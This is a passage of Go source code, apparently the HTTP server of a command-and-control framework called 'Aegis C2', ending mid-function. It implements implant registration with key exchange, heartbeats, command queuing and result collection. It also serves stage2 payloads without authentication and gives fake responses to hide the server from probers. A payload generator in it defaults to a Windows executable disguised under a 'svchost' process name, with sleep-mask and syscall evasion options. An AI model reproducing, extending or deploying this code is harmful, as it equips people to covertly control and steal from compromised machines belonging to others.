package http

import (
	"context"
	"crypto/rand"
	"crypto/sha256"
	"crypto/subtle"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"github.com/aegis-c2/aegis/server/agent"
	"github.com/aegis-c2/aegis/server/audit"
	"github.com/aegis-c2/aegis/server/builder"
	"github.com/aegis-c2/aegis/server/config"
	"github.com/aegis-c2/aegis/server/core"
	servercrypto "github.com/aegis-c2/aegis/server/crypto"
	"github.com/aegis-c2/aegis/server/db"
	"github.com/aegis-c2/aegis/server/dispatcher"
	"github.com/aegis-c2/aegis/server/event"
	"github.com/aegis-c2/aegis/server/gateway"
	"github.com/aegis-c2/aegis/server/llm"
	"github.com/aegis-c2/aegis/server/listener"
	"github.com/aegis-c2/aegis/server/operator"
	"github.com/aegis-c2/aegis/server/profile"
	"github.com/aegis-c2/aegis/server/stage"
	"github.com/aegis-c2/aegis/server/webhook"
	"github.com/aegis-c2/aegis/server/weaponize"
	"github.com/aegis-c2/aegis/server/yamux"
	"github.com/aegis-c2/aegis/shared/compress"
	"github.com/aegis-c2/aegis/shared/encoder"
	"github.com/aegis-c2/aegis/shared/protocol"
	"github.com/aegis-c2/aegis/shared/types"
	"github.com/gorilla/mux"
	"github.com/gorilla/websocket"
)

// Server 是 C2 服务端的核心结构体。
type Server struct {
	cfg            *config.ServerConfig
	coreSvc        *core.Service
	agentMgr       *agent.Manager
	dispatcher     *dispatcher.Dispatcher
	gateway        *gateway.Gateway
	audit          *audit.Logger
	nonceCache     *servercrypto.AgentNonceCache
	rsaKeyPair     *servercrypto.RSAKeyPair
	ecdhKeyPair    *servercrypto.ECDHKeyPair
	payloadBuilder *builder.Builder
	database       *db.DB
	eventBroker    *event.Broker
	webhook        *webhook.Notifier
	listenerMgr    *listener.Manager
	operatorMgr    *operator.Manager
	weaponBuilder  *weaponize.Builder
	profileMgr     *profile.Manager
	profileValid   *profile.Validator
	llmAnalyst     *llm.Analyst
	done           chan struct{}
	closeOnce      sync.Once      // prevents double-close panic
	httpServer     *http.Server // 用于优雅关机
	apiKey         string       // operator API key (set from env or config)
	stageStore     map[string][]byte // staged payload store: payloadID → encrypted stage2
	stageMu        sync.RWMutex
	stageRegistry  *stage.Registry // Stage2 注册表（分离式交付）
}

func New(cfg *config.ServerConfig) (*Server, error) {
	// ARCH-5: Persist and reload RSA+ECDH keys across server restarts
	rsaKeys, err := loadOrGenerateRSAKeys(cfg)
	if err != nil {
		return nil, err
	}
	ecdhKeys, err := loadOrGenerateECDHKeys(cfg)
	if err != nil {
		return nil, err
	}

	nonceCache := servercrypto.NewAgentNonceCache(0)

	auditLog, err := audit.New("audit.log")
	if err != nil {
		return nil, fmt.Errorf("audit log initialization failed: %w", err)
	}

	gw := gateway.NewGateway(cfg, nonceCache)

	// 初始化 Payload 构建器
	buildsDir := filepath.Join("builds")
	os.MkdirAll(buildsDir, 0755)
	projectRoot, _ := filepath.Abs(".")
	pl := builder.NewWithECDH(rsaKeys, ecdhKeys, "", buildsDir, projectRoot)

	// 初始化数据库
	database, err := db.Open("aegis.db")
	if err != nil {
		return nil, fmt.Errorf("database initialization failed: %w", err)
	}

	// 初始化事件代理
	eventBroker := event.NewBroker(1000)

	// 初始化 Webhook 通知器（默认未配置 URL，需通过 CLI 或 API 设置）
	webhookNotifier := webhook.NewNotifier(&webhook.Config{
		Provider: webhook.Discord,
		Username: "Aegis C2",
		Timeout:  10 * time.Second,
	})

	// 初始化监听器管理器
	listenerMgr := listener.NewManager()

	// 初始化操作符管理器
	operatorMgr := operator.NewManager()

	// 初始化武器化构建器
	weaponDir := filepath.Join("weaponize")
	os.MkdirAll(weaponDir, 0755)
	weaponBuilder := weaponize.New(weaponDir)

	// 初始化 Profile 管理器
	profileMgr := profile.NewManager()
	profileValid := profile.NewValidator(profileMgr.Active())

	// 初始化 LLM 智能体（可选：需要配置 API Key）
	llmAnalyst := llm.NewAnalyst(nil) // 默认配置，需设置 API Key 后才能使用

	// 订阅事件并触发 Webhook 通知（当事件有 URL 配置时）
	go func() {
		ch, _ := eventBroker.Subscribe(event.TaskCompleted, "webhook")
		for e := range ch {
			title := string(e.Type)
			content := fmt.Sprintf("Agent: %s, Task: %s", e.AgentID, e.TaskID)
			webhookNotifier.Send(title, content)
		}
	}()

	// 桥接 event broker → operator 事件流
	go func() {
		ch, _ := eventBroker.SubscribeAll("server")
		for e := range ch {
			opEvent := &operator.Event{
				ID:        e.ID,
				Type:      string(e.Type),
				Timestamp: e.Timestamp,
				AgentID:   e.AgentID,
				Payload:   fmt.Sprintf("%v", e.Data),
			}
			operatorMgr.Broadcast(opEvent)
		}
	}()

	s := &Server{
		cfg:            cfg,
		agentMgr:       agent.NewManager(database),
		dispatcher:     dispatcher.NewDispatcher(database, eventBroker),
		gateway:        gw,
		audit:          auditLog,
		nonceCache:     nonceCache,
		rsaKeyPair:     rsaKeys,
		ecdhKeyPair:    ecdhKeys,
		payloadBuilder: pl,
		database:       database,
		eventBroker:    eventBroker,
		webhook:        webhookNotifier,
		listenerMgr:    listenerMgr,
		operatorMgr:    operatorMgr,
		weaponBuilder:  weaponBuilder,
		profileMgr:     profileMgr,
		profileValid:   profileValid,
		llmAnalyst:     llmAnalyst,
		done:           make(chan struct{}),
		apiKey:         resolveAPIKey(cfg),
		stageStore:     make(map[string][]byte),
		stageRegistry:  stage.NewRegistry(),
	}
	return s, nil
}

// NewWithCore 创建 HTTP 服务器，复用已有的 core.Service。
func NewWithCore(cfg *config.ServerConfig, coreSvc *core.Service) (*Server, error) {
	return &Server{
		cfg:            cfg,
		coreSvc:        coreSvc,
		agentMgr:       coreSvc.AgentMgr,
		dispatcher:     coreSvc.Dispatcher,
		gateway:        coreSvc.Gateway,
		audit:          coreSvc.Audit,
		nonceCache:     coreSvc.NonceCache,
		rsaKeyPair:     coreSvc.RsaKeyPair,
		ecdhKeyPair:    coreSvc.EcdhKeyPair,
		payloadBuilder: coreSvc.Builder,
		database:       coreSvc.Database,
		eventBroker:    coreSvc.EventBroker,
		webhook:        coreSvc.Webhook,
		listenerMgr:    coreSvc.ListenerMgr,
		operatorMgr:    coreSvc.OperatorMgr,
		weaponBuilder:  coreSvc.WeaponBuilder,
		profileMgr:     coreSvc.ProfileMgr,
		profileValid:   coreSvc.ProfileValid,
		llmAnalyst:     nil,
		done:           make(chan struct{}),
		apiKey:         resolveAPIKey(cfg),
		stageStore:     make(map[string][]byte),
		stageRegistry:  coreSvc.StageRegistry,
	}, nil
}

// rsaFingerprint 返回 RSA 公钥的 SHA256 指纹前缀（避免日志泄漏完整密钥）。
func rsaFingerprint(pem []byte) string {
	h := sha256.Sum256(pem)
	return hex.EncodeToString(h[:8])
}

// Start 启动 HTTP(S) 监听器。
func (s *Server) Start() error {
	r := mux.NewRouter()

	// Agent 端点 — 默认路由 + Profile 驱动路由
	r.HandleFunc("/register", s.handleRegister).Methods("POST")
	r.HandleFunc("/heartbeat", s.handleHeartbeat).Methods("POST")
	r.HandleFunc("/poll", s.handlePoll).Methods("POST")
	r.HandleFunc("/result", s.handleResult).Methods("POST")

	// WebSocket 端点（CDN/域前置链路）
	r.HandleFunc("/ws", s.handleWebSocket).Methods("GET")
	r.HandleFunc("/ws/yamux", s.handleWebSocketYamux).Methods("GET")

	// Stage 端点（stager 从此下载 stage2 — 无需认证，stager 无认证能力）
	r.HandleFunc("/stage/{id}", s.handleStage).Methods("GET")

	// Stage2 注册表端点（分离式交付）
	// GET/POST: Stage1 运行时调用，获取 stage2 下载 URL + AES 密钥（无需认证）
	r.HandleFunc("/api/stage", s.handleStageLookup).Methods("GET", "POST")
	// GET: 列出所有已注册的 Stage2（operator 用）
	r.HandleFunc("/api/stage/list", s.requireAPIKey(s.handleStageList)).Methods("GET")
	// POST: 注册 Stage2（operator 用，也可走 gRPC）
	r.HandleFunc("/api/stage/register", s.requireAPIKey(s.handleStageRegister)).Methods("POST")

	// Client API 端点（需要 API Key 认证）
	r.HandleFunc("/api/agents", s.requireAPIKey(s.handleListAgents)).Methods("GET")
	r.HandleFunc("/api/tasks", s.requireAPIKey(s.handleCreateTask)).Methods("POST")
	r.HandleFunc("/api/tasks/{id}", s.requireAPIKey(s.handleGetTask)).Methods("GET")
	r.HandleFunc("/api/generate", s.requireAPIKey(s.handleGenerate)).Methods("POST")
	r.HandleFunc("/api/pubkey", s.handleGetPubKey).Methods("GET")            // public: agent needs this
	r.HandleFunc("/api/ecdhpubkey", s.handleGetECDHPubKey).Methods("GET")      // public: agent needs this

	// Operator 端点（需要 API Key 认证）
	r.HandleFunc("/api/operators/register", s.requireAPIKey(s.handleOperatorRegister)).Methods("POST")
	r.HandleFunc("/api/operators", s.requireAPIKey(s.handleOperatorList)).Methods("GET")
	r.HandleFunc("/api/operators/{id}/connect", s.requireAPIKey(s.handleOperatorConnect)).Methods("POST")
	r.HandleFunc("/api/operators/{id}/events", s.requireAPIKey(s.handleOperatorEvents)).Methods("GET")
	r.HandleFunc("/api/events", s.requireAPIKey(s.handleEventHistory)).Methods("GET")

	// 武器化链端点（需要 API Key 认证）
	r.HandleFunc("/api/weaponize", s.requireAPIKey(s.handleWeaponize)).Methods("POST")
	r.HandleFunc("/api/weaponize/config", s.requireAPIKey(s.handleWeaponizeConfig)).Methods("GET")

	// LLM 智能体端点（需要 API Key 认证）
	r.HandleFunc("/api/llm/analyze", s.requireAPIKey(s.handleLLMAnalyze)).Methods("POST")
	r.HandleFunc("/api/llm/result/{agent_id}", s.requireAPIKey(s.handleLLMResult)).Methods("GET")
	r.HandleFunc("/api/llm/config", s.requireAPIKey(s.handleLLMConfig)).Methods("POST")

	// Profile 驱动的动态端点（必须放在所有 API 路由之后，防止 PathPrefix 兜底拦截）
	s.registerProfileRoutes(r)

	// 速率限制重置定时器
	go func() {
		ticker := time.NewTicker(time.Minute)
		defer ticker.Stop()
		for {
			select {
			case <-s.done:
				return
			case <-ticker.C:
				s.gateway.ResetRateLimit()
			}
		}
	}()

	// 心跳超时检查定时器
	go func() {
		ticker := time.NewTicker(10 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-s.done:
				return
			case <-ticker.C:
				s.checkHeartbeatTimeouts()
			}
		}
	}()

	// 启动 Profile 文件热加载监控
	go s.profileMgr.WatchAndReload(10 * time.Second)
	log.Printf("[SERVER] RSA public key fingerprint: %s", rsaFingerprint(s.rsaKeyPair.PublicKeyPEM()))

	log.Printf("[SERVER] listening on %s", s.cfg.ListenAddr)

	s.httpServer = &http.Server{Addr: s.cfg.ListenAddr, Handler: r}

	// 启动 HTTP 服务（非阻塞）
	go func() {
		var err error
		if s.cfg.CertFile != "" && s.cfg.KeyFile != "" {
			log.Printf("[SERVER] TLS enabled: cert=%s key=%s", s.cfg.CertFile, s.cfg.KeyFile)
			err = s.httpServer.ListenAndServeTLS(s.cfg.CertFile, s.cfg.KeyFile)
		} else {
			err = s.httpServer.ListenAndServe()
		}
		if err != nil && err != http.ErrServerClosed {
			log.Printf("[SERVER] HTTP server error: %v", err)
		}
	}()
	return nil
}

// GracefulShutdown 优雅关闭 HTTP 服务器、dispatcher 和定时器。
func (s *Server) GracefulShutdown(ctx context.Context) error {
	s.closeOnce.Do(func() { close(s.done) })
	// P1-26 fix: stop dispatcher to prevent goroutine leaks
	if s.dispatcher != nil {
		s.dispatcher.Stop()
	}
	if s.httpServer != nil {
		return s.httpServer.Shutdown(ctx)
	}
	return nil
}

// Shutdown 停止后台定时器（兼容旧 API）。
func (s *Server) Shutdown() {
	s.closeOnce.Do(func() { close(s.done) })
	// P1-26 fix: stop dispatcher to prevent goroutine leaks
	if s.dispatcher != nil {
		s.dispatcher.Stop()
	}
}

// PayloadBuilder returns the payload builder (for gRPC server wiring).
func (s *Server) PayloadBuilder() *builder.Builder {
	return s.payloadBuilder
}

// ProfileManager returns the profile manager (for gRPC server wiring).
func (s *Server) ProfileManager() *profile.Manager {
	return s.profileMgr
}

// ListenerManager returns the listener manager (for gRPC server wiring).
func (s *Server) ListenerManager() *listener.Manager {
	return s.listenerMgr
}

// ServerURL returns the server's external callback URL base.
func (s *Server) ServerURL() string {
	if url := os.Getenv("AEGIS_SERVER_URL"); url != "" {
		return url
	}
	// Fallback: derive from listen addr
	addr := s.cfg.ListenAddr
	if addr == "" || addr == ":8443" {
		return "" // caller should use lhost override
	}
	if strings.HasPrefix(addr, ":") {
		return "http://0.0.0.0" + addr
	}
	return "http://" + addr
}

// StageStore returns the staged payload store map (for builder to write encrypted stage2).
func (s *Server) StageStore() map[string][]byte {
	return s.stageStore
}

// StageRegistry returns the Stage2 registry (for gRPC server wiring).
func (s *Server) StageRegistry() *stage.Registry {
	return s.stageRegistry
}

// HTTPServer 返回底层 http.Server（供外部监控/健康检查）。
func (s *Server) HTTPServer() *http.Server {
	return s.httpServer
}

// resolveAPIKey 从环境变量或配置中获取 API Key。
// 如果都未设置，自动生成随机 key（禁止无认证模式）。
func resolveAPIKey(cfg *config.ServerConfig) string {
	if key := os.Getenv("AEGIS_API_KEY"); key != "" {
		return key
	}
	if cfg.APIKey != "" {
		return cfg.APIKey
	}
	// 生产环境必须设置 API Key — 自动生成随机 key 防止无认证
	b := make([]byte, 32)
	rand.Read(b)
	key := hex.EncodeToString(b)
	log.Printf("[SERVER] auto-generated API key (set AEGIS_API_KEY to override)")
	return key
}

// requireAPIKey 中间件：要求请求携带有效的 API Key。
func (s *Server) requireAPIKey(next http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		auth := r.Header.Get("Authorization")
		expected := "Bearer " + s.apiKey
		if len(auth) != len(expected) || len(auth) == 0 {
			http.Error(w, "unauthorized", http.StatusUnauthorized)
			return
		}
		if subtle.ConstantTimeCompare([]byte(auth), []byte(expected)) != 1 {
			http.Error(w, "unauthorized", http.StatusUnauthorized)
			return
		}
		next(w, r)
	}
}

// parseEnvelope 从请求体中读取并解析 Envelope（带大小限制）。
// 如果 Profile 配置了 dataTransform，先对 body 解码。
func (s *Server) parseEnvelope(r *http.Request) (*protocol.Envelope, error) {
	const maxBodySize = 10 * 1024 * 1024
	limited := io.LimitReader(r.Body, maxBodySize+1)
	body, err := io.ReadAll(limited)
	if err != nil {
		return nil, err
	}
	if len(body) > maxBodySize {
		return nil, fmt.Errorf("envelope too large (>10MB)")
	}

	// Decode body at wire-level if profile specifies a data transform.
	if profile := s.profileMgr.Active(); profile != nil && profile.HTTP.DataTransform != "" {
		enc, err := encoder.GetEncoder(profile.HTTP.DataTransform)
		if err == nil {
			decoded, decErr := enc.Decode(body)
			if decErr == nil {
				body = decoded
			}
		}
	}

	var env protocol.Envelope
	if err := json.Unmarshal(body, &env); err != nil {
		return nil, err
	}
	return &env, nil
}

// validateAgentRequest 检查请求是否符合激活的 C2 Profile 特征。
// 不符合时记录审计并返回 false，调用方应直接返回假响应。
func (s *Server) validateAgentRequest(w http.ResponseWriter, r *http.Request) bool {
	if s.profileValid == nil {
		return true
	}
	// 每次请求前更新到最新 profile
	s.profileValid.UpdateProfile(s.profileMgr.Active())

	result := s.profileValid.Validate(r)
	if result.Valid {
		return true
	}

	// Profile 不匹配：记录审计事件，返回假响应（不暴露服务端存在）
	s.audit.Log("PROFILE_MISMATCH", map[string]string{
		"ip":     r.RemoteAddr,
		"reason": result.Reason,
		"score":  fmt.Sprintf("%d", result.Score),
	})

	// 蜂蜜响应：返回看似正常的响应以迷惑探测者
	if result.IsHoneyCheck() {
		json.NewEncoder(w).Encode(map[string]string{"status": "ok"})
		return false
	}

	http.Error(w, "not found", http.StatusNotFound)
	return false
}

// handleRegister 处理 Agent 注册。
func (s *Server) handleRegister(w http.ResponseWriter, r *http.Request) {
	// 1. IP 白名单
	if err := s.gateway.CheckIP(r); err != nil {
		s.audit.Log("GATEWAY_BLOCK", map[string]string{
			"reason": "ip_whitelist", "ip": r.RemoteAddr,
		})
		http.Error(w, "blocked", http.StatusForbidden)
		return
	}

	// 2. 注册端点豁免 Profile 验证 — Agent 初始信标不应被 profile 路径阻挡
	// Profile 验证适用于 /heartbeat /poll /result 等后续 C2 通信
	// 但 /register 是首次接触，任何合法 Agent 都必须能到达

	// 3. 解析 Envelope
	env, err := s.parseEnvelope(r)
	if err != nil {
		http.Error(w, "bad envelope", http.StatusBadRequest)
		return
	}

	// 3. Nonce 重放检查
	if s.nonceCache.Check(env.AgentID, env.Nonce) {
		s.audit.Log("REPLAY_DETECTED", map[string]string{"ip": r.RemoteAddr})
		http.Error(w, "replay detected", http.StatusForbidden)
		return
	}

	// 4. 解析注册载荷
	// A-P0-1: 优先尝试 ECDH 解密（Agent 现在用 AES-GCM 加密注册载荷）
	var regPayload protocol.RegisterPayload
	var aesKey, hmacKey []byte
	var payloadDecrypted bool

	// ECDH 预解密：从 env.Payload 中提取 ECDHPubKey（JSON 字段名是 ecdh_pub_key）
	if s.ecdhKeyPair != nil {
		var preCheck struct {
			ECDHPubKey []byte `json:"ecdh_pub_key"`
		}
		if json.Unmarshal(env.Payload, &preCheck) == nil && len(preCheck.ECDHPubKey) == 32 {
			derivedAES, derivedHMAC, err := servercrypto.DeriveSessionKeys(s.ecdhKeyPair, preCheck.ECDHPubKey, env.AgentID)
			if err == nil {
				decrypted, decErr := servercrypto.DecryptAESGCM(derivedAES, env.Nonce, env.Payload)
				if decErr == nil {
					if err := json.Unmarshal(decrypted, &regPayload); err == nil {
						if env.Verify(derivedHMAC) {
							aesKey = derivedAES
							hmacKey = derivedHMAC
							payloadDecrypted = true
						}
					}
				}
			}
		}
	}

	if !payloadDecrypted {
		if err := json.Unmarshal(env.Payload, &regPayload); err != nil {
			http.Error(w, "bad payload", http.StatusBadRequest)
			return
		}
		// 非 ECDH 路径：从注册载荷中派生密钥
		if len(regPayload.AESKeyEnc) > 0 {
			key, err := s.rsaKeyPair.Decrypt(regPayload.AESKeyEnc)
			if err != nil {
				s.audit.Log("REGISTER_FAILED", map[string]string{
					"agent_id": regPayload.AgentID, "reason": "aes_key_decrypt_failed",
				})
				http.Error(w, "auth failed", http.StatusForbidden)
				return
			}
			aesKey = key
			hmacKey = aesKey
		} else if len(regPayload.ECDHPubKey) == 32 && s.ecdhKeyPair != nil {
			var err error
			aesKey, hmacKey, err = servercrypto.DeriveSessionKeys(s.ecdhKeyPair, regPayload.ECDHPubKey, regPayload.AgentID)
			if err != nil {
				s.audit.Log("REGISTER_FAILED", map[string]string{
					"agent_id": regPayload.AgentID, "reason": "ecdh_derivation_failed",
				})
				http.Error(w, "auth failed", http.StatusForbidden)
				return
			}
		}
	}

	// 5c. 提取远程 IP
	ip, _, err := net.SplitHostPort(r.RemoteAddr)
	if err != nil {
		ip = r.RemoteAddr
	}

	// 5b. 拒绝重复注册（N-P1-2: 用原子 check-and-create 防止 TOCTOU 竞争）
	agent, created, err := s.agentMgr.RegisterIfAbsent(&regPayload, ip)
	if err != nil {
		http.Error(w, "register failed", http.StatusInternalServerError)
		return
	}
	if !created {
		s.audit.Log("REGISTER_DUPLICATE", map[string]string{
			"agent_id": regPayload.AgentID, "reason": "agent_id_already_registered_atomic",
		})
		http.Error(w, "agent already registered", http.StatusConflict)
		return
	}
	agent.SetAESKey(aesKey)
	if hmacKey != nil {
		agent.SetHMACKey(hmacKey)
	}

	// Fallback: server generates AES key when no key exchange occurred
	// (dev mode: no server pubkey embedded, no ECDH). This ensures the
	// agent and server share a key for subsequent encrypted communication.
	if len(aesKey) == 0 {
		aesKey = make([]byte, 16)
		rand.Read(aesKey)
		agent.SetAESKey(aesKey)
		agent.SetHMACKey(aesKey)
		s.audit.Log("SERVER_AES_GENERATED", map[string]string{
			"agent_id": regPayload.AgentID,
		})
	}

	s.audit.Log("AGENT_REGISTER", map[string]string{
		"agent_id": regPayload.AgentID, "hostname": regPayload.Hostname,
		"os": regPayload.OS, "ip": ip,
	})

	// 发布 Agent 上线事件
	if s.eventBroker != nil {
		s.eventBroker.Publish(event.AgentOnlineEvent(
			agent.ID, agent.Hostname, agent.OS, agent.Arch,
		))
	}

	resp := map[string]string{"status": "ok", "agent_id": agent.ID}

	// Return AES key to agent — encrypted with agent's pubkey if available,
	// or plaintext hex in dev mode.
	if regPayload.PubKeyPEM != nil {
		enc, err := servercrypto.EncryptWithPublicKey(regPayload.PubKeyPEM, aesKey)
		if err == nil {
			resp["aes_key_enc"] = hex.EncodeToString(enc)
		}
	} else {
		// Dev mode fallback: return key in plaintext hex. In production this
		// branch is unreachable because ECDH or RSA key exchange always applies.
		resp["aes_key"] = hex.EncodeToString(aesKey)
	}

	json.NewEncoder(w).Encode(resp)
}

// handleHeartbeat 处理 Agent 心跳。
func (s *Server) handleHeartbeat(w http.ResponseWriter, r *http.Request) {
	if !s.validateAgentRequest(w, r) {
		return
	}

	ctx := s.authenticateAgent(w, r)
	if ctx == nil {
		return
	}

	hb := s.parseHeartbeat(ctx, w)
	if hb == nil {
		return
	}

	if _, err := s.agentMgr.ProcessHeartbeat(hb.AgentID, hb.SeqNum); err != nil {
		http.Error(w, "unknown agent", http.StatusNotFound)
		return
	}

	s.audit.Log("HEARTBEAT", map[string]string{
		"agent_id": hb.AgentID, "seq": fmt.Sprintf("%d", hb.SeqNum),
	})

	if s.eventBroker != nil {
		s.eventBroker.Publish(&event.Event{
			Type:    event.AgentHeartbeat,
			AgentID: hb.AgentID,
			Source:  "heartbeat",
			Data: map[string]interface{}{
				"seq_num": hb.SeqNum,
			},
		})
	}

	json.NewEncoder(w).Encode(map[string]string{"status": "ok"})
}

// handlePoll 处理 Agent 任务拉取。
func (s *Server) handlePoll(w http.ResponseWriter, r *http.Request) {
	if !s.validateAgentRequest(w, r) {
		return
	}

	ctx := s.authenticateAgent(w, r)
	if ctx == nil {
		return
	}

	hb := s.parseHeartbeat(ctx, w)
	if hb == nil {
		return
	}

	// Rate limit — check early before any expensive operations
	if err := s.gateway.CheckRateLimit(hb.AgentID); err != nil {
		s.audit.Log("RATE_LIMIT", map[string]string{
			"agent_id": hb.AgentID, "reason": err.Error(),
		})
		http.Error(w, `{"error": "rate limit exceeded"}`, http.StatusTooManyRequests)
		return
	}

	// 取出任务
	task := s.dispatcher.NextTask(hb.AgentID)
	if task == nil {
		json.NewEncoder(w).Encode(map[string]interface{}{"task": nil})
		return
	}

	taskPayload := protocol.TaskPayload{
		TaskID:   task.ID,
		Command:  task.Command,
		Args:     task.Args,
		Timeout:  task.Timeout,
		Priority: task.Priority,
		AuditTag: task.AuditTag,
	}
	respData, _ := json.Marshal(map[string]interface{}{"task": taskPayload})

	// 大于 1KB 时压缩响应，减少网络流量
	if len(respData) > 1024 {
		compressed, err := compress.GzipCompress(respData)
		if err == nil {
			w.Header().Set("Content-Encoding", "gzip")
			respData = compressed
		}
	}
	w.Write(respData)
}

// handleResult 处理 Agent 任务结果回传。
func (s *Server) handleResult(w http.ResponseWriter, r *http.Request) {
	if !s.validateAgentRequest(w, r) {
		return
	}

	ctx := s.authenticateAgent(w, r)
	if ctx == nil {
		return
	}
	if ctx.Agent == nil {
		http.Error(w, "unknown agent", http.StatusNotFound)
		return
	}

	var result protocol.ResultPayload
	if err := json.Unmarshal(ctx.Payload, &result); err != nil {
		http.Error(w, "bad payload", http.StatusBadRequest)
		return
	}

	// S-P0-2: 交叉验证 result.AgentID 与已认证 Agent ID
	if result.AgentID != ctx.Agent.ID {
		s.audit.Log("AGENT_ID_SPOOF", map[string]string{
			"claimed": result.AgentID, "authenticated": ctx.Agent.ID,
		})
		http.Error(w, "agent id mismatch", http.StatusForbidden)
		return
	}

	s.dispatcher.SubmitResult(&result)

	s.audit.Log("TASK_RESULT", map[string]string{
		"task_id": result.TaskID, "agent_id": result.AgentID, "status": result.Status,
	})

	json.NewEncoder(w).Encode(map[string]string{"status": "received"})
}

// handleListAgents 返回所有 Agent 列表。
func (s *Server) handleListAgents(w http.ResponseWriter, r *http.Request) {
	var agents []*types.Agent
	if s.coreSvc != nil {
		agents = s.coreSvc.ListAgents()
	} else {
		agents = s.agentMgr.ListAgents()
	}
	type agentInfo struct {
		ID       string `json:"id"`
		Hostname string `json:"hostname"`
		OS       string `json:"os"`
		Arch     string `json:"arch"`
		Username string `json:"username"`
		IP       string `json:"ip"`
		State    string `json:"state"`
		Seen     string `json:"last_seen"`
	}
	info := make([]agentInfo, 0, len(agents))
	for _, a := range agents {
		info = append(info, agentInfo{
			ID: a.ID, Hostname: a.Hostname, OS: a.OS, Arch: a.Arch,
			Username: a.Username, IP: a.IP, State: string(a.GetState()),
			Seen: a.LastHeartbeat.Format("15:04:05"),
		})
	}
	json.NewEncoder(w).Encode(info)
}

// handleCreateTask 创建新任务。
func (s *Server) handleCreateTask(w http.ResponseWriter, r *http.Request) {
	var req struct {
		AgentID string `json:"agent_id"`
		Command string `json:"command"`
		Args    string `json:"args"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}

	// 安全审查
	if err := s.gateway.CheckCommand(req.Command); err != nil {
		s.audit.Log("COMMAND_BLOCKED", map[string]string{
			"command": req.Command, "reason": err.Error(),
		})
		http.Error(w, err.Error(), http.StatusForbidden)
		return
	}

	task := s.dispatcher.Submit(req.AgentID, req.Command, req.Args,
		s.cfg.TaskTimeoutSec, 3, "cli")

	s.audit.Log("TASK_CREATED", map[string]string{
		"task_id": task.ID, "agent_id": req.AgentID, "command": req.Command,
	})

	json.NewEncoder(w).Encode(map[string]string{"task_id": task.ID, "status": "queued"})
}

// handleGetTask 查询任务状态。
func (s *Server) handleGetTask(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	id := vars["id"]

	result, ok := s.dispatcher.GetResult(id)
	if !ok {
		http.Error(w, "not found", http.StatusNotFound)
		return
	}

	json.NewEncoder(w).Encode(result)
}

func (s *Server) checkHeartbeatTimeouts() {
	threshold := time.Duration(s.cfg.HeartbeatInterval*3) * time.Second
	for _, a := range s.agentMgr.ListAgents() {
		if a.GetState() == types.StateFused {
			continue
		}
		if time.Since(a.LastHeartbeat) > threshold {
			failCount := a.IncrFail()

			// P2-12: Use failCount directly to avoid TOCTOU race.
			// If MaxHeartbeatFailures < 3, transition through Suspect first.
			if failCount < 3 && failCount >= s.cfg.CircuitBreaker.MaxHeartbeatFailures {
				a.SetState(types.StateSuspect)
			} else if failCount >= s.cfg.CircuitBreaker.MaxHeartbeatFailures {
				a.SetState(types.StateFused)
				s.audit.Log("CIRCUIT_BREAK", map[string]string{
					"agent_id": a.ID, "reason": "heartbeat_timeout",
				})
				// 发布熔断事件
				if s.eventBroker != nil {
					s.eventBroker.Publish(&event.Event{
						Type:    event.CircuitBreakerTrip,
						AgentID: a.ID,
						Source:  "server",
						Data: map[string]interface{}{
							"reason":      "heartbeat_timeout",
							"fail_count":  failCount,
							"threshold":   s.cfg.CircuitBreaker.MaxHeartbeatFailures,
						},
					})
				}
				s.agentMgr.MarkOffline(a.ID)
				s.nonceCache.Remove(a.ID)
			} else if failCount >= 3 {
				a.SetState(types.StateSuspect)
			}
		}
	}
}

// handleGenerate 动态编译 Payload（借鉴 Sliver 的 builder 机制）。
func (s *Server) handleGenerate(w http.ResponseWriter, r *http.Request) {
	var req struct {
		Name              string `json:"name"`
		GOOS              string `json:"goos"`
		GOARCH            string `json:"goarch"`
		Format            string `json:"format"`
		ServerURL         string `json:"server_url"`
		LHost             string `json:"lhost"`
		LPort             int    `json:"lport"`
		HeartbeatInterval int    `json:"heartbeat_interval"`
		HeartbeatJitter   int    `json:"heartbeat_jitter"`
		UserAgent         string `json:"user_agent"`
		ProcessName       string `json:"process_name"`
		SleepMaskEnabled  bool   `json:"sleep_mask"`
		SyscallEnabled    bool   `json:"syscall"`
		Profile           string `json:"profile"`
		Stage             string `json:"stage"` // "" (stageless) / "stage1" / "stage2"
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}

	// 默认值
	if req.Name == "" {
		req.Name = fmt.Sprintf("aegis-%d", time.Now().UnixNano())
	}
	if req.GOOS == "" {
		req.GOOS = "windows"
	}
	if req.GOARCH == "" {
		req.GOARCH = "amd64"
	}
	if req.Format == "" {
		req.Format = "exe"
	}
	if req.ServerURL == "" && req.LHost != "" {
		if req.LPort > 0 {
			req.ServerURL = fmt.Sprintf("http://%s:%d", req.LHost, req.LPort)
		} else {
			req.ServerURL = fmt.Sprintf("http://%s:8443", req.LHost)
		}
	}
	if req.ServerURL == "" {
		req.ServerURL = fmt.Sprintf("http://127.0.0.1%s", s.cfg.ListenAddr)
	}
	if req.HeartbeatInterval == 0 {
		req.HeartbeatInterval = s.cfg.HeartbeatInterval
	}
	if req.HeartbeatJitter == 0 {
		req.HeartbeatJitter = 5
	}
	if req.UserAgent == "" {
		req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
	}
	if req.ProcessName == "" {
		req.ProcessName = "svchost"
	}

	cfg := &builder.BuildConfig{
		Name:              req.Name,
		GOOS:              req.GOOS,
		GOARCH:            req.GOARCH,
		Format:            builder.OutputFormat(req.Format),
		ServerURL:         req.ServerURL,
		HeartbeatInterval: req.HeartbeatInterval,
		HeartbeatJitter:   req.HeartbeatJitter,
		UserAgent:         req.UserAgent,
		ProcessName:       req.ProcessName,
		SleepMaskEnabled:  req.SleepMaskEnabled,
		SyscallEnabled:    req.SyscallEnabled,
		ProfileName:       req.Profile,
	}

	// 如果指定了 Profile，应用其配置
	if req.Profile != "" {
		if p, ok := s.profileMgr.Get(req.Profile); ok {
			cfg.ProfileMethod = p.HTTP.Method
			cfg.ProfilePath = p.HTTP.Path
			cfg.ProfileHeaders = p.HTTP.Headers
